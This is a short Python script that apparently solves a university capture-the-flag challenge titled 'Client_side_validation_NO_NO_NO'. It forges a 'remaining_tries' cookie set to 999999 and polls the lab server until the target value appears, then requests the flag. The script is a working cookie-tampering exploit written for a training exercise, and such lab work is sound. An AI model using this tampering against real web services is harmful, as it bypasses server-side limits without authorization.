# SSof{Client_side_validation_NO_NO_NO}
import requests
from random import randint

baseurl = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22054"
r = requests.get(f'{baseurl}/hello')

payload_cookies = dict(remaining_tries='999999', user=r.cookies['user'])

while True:
    r = requests.get(f'{baseurl}/more', cookies=payload_cookies)
    values = list(map(lambda x: x.split(': ')[-1], r.text.split('<br>')))
    have = values[0]
    target = values[1]
    current = values[2]

    if current == target:
        break
    print(r.text)
    print(values)

print(r.cookies.items())
print(r.text)
r = requests.get(f'{baseurl}/finish', cookies=payload_cookies)
print(r.text)
